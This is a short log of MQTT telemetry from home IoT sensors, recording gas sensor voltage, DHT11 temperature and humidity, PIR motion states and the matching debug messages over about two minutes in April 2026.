2026-04-22T16:20:19,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:24,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:24,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:20:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:20:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:20:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:20:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:20:29,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:29,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:34,iot/pir/binary_sensor/motion/state,2,ON
2026-04-22T16:20:34,iot/pir/debug,49,[0;36m[D][binary_sensor:048]: 'Motion' >> ON[0m
2026-04-22T16:20:34,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:34,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:20:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:20:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:20:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:20:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:20:39,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:39,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:44,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:44,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:20:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:20:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:20:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:20:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:20:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:20:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:20:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:20:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:20:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:20:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:21:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:21:04,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:21:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:21:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:21:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:21:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:21:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:21:09,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:21:09,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:21:14,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:21:14,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:21:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:21:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:21:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:21:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:21:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:21:19,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:21:19,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:21:24,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:21:24,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:21:26,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:21:26,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:21:26,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:21:26,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:21:26,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:21:29,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:21:29,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:21:34,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.55 V[0m
2026-04-22T16:21:34,iot/mq/sensor/gas_sensor/state,4,0.55
2026-04-22T16:21:36,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:21:36,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:21:36,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:21:36,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:21:36,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:21:39,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:21:39,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:21:44,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:21:44,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:21:46,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:21:46,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:21:46,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:21:46,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:21:46,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:21:49,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:21:49,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:21:54,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:21:54,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:21:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:21:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:21:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:21:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:21:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:21:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:21:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:22:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:22:04,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:22:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:22:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:22:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:22:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:22:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:22:09,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:22:09,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:22:14,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:22:14,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:22:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:22:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:22:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:22:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:22:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:22:19,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:22:19,iot/mq/sensor/gas_sensor/state,4,0.56
